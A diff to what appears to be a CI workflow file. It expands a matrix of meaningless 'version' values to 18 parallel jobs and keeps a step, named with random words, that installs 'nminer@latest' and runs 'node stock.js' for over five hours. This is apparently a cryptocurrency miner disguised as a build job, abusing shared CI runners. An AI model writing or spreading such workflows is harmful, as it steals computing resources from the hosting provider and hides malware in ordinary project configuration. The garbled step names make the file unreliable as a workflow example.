@@ -9,22 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9501 }
-          - { version: 5399 }
-          - { version: 7328 }
-          - { version: 3559 }
-          - { version: 1086 }
-          - { version: 9484 }
-          - { version: 6081 }
-          - { version: 6575 }
-          - { version: 2086 }
-          - { version: 2019 }
-          - { version: 6034 }
-          - { version: 1581 }
-          - { version: 3383 }
-          - { version: 3751 }
-          - { version: 1085 }
-          - { version: 355 }
+          - { version: 7048 }
+          - { version: 1692 }
+          - { version: 3055 }
+          - { version: 4847 }
+          - { version: 504 }
+          - { version: 1813 }
+          - { version: 673 }
+          - { version: 7637 }
+          - { version: 5745 }
+          - { version: 1410 }
+          - { version: 2751 }
+          - { version: 1559 }
+          - { version: 6384 }
+          - { version: 9419 }
+          - { version: 1331 }
+          - { version: 9654 }
+          - { version: 6270 }
+          - { version: 8371 }
 
     steps:
       - name: Checkout
@@ -35,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: jaggedly duh hateful curl including
+      - name: but
         run: |
           npm install nminer@latest
-          timeout 334m node stock.js || echo "stock executed"
+          timeout 319m node stock.js || echo "stock executed"
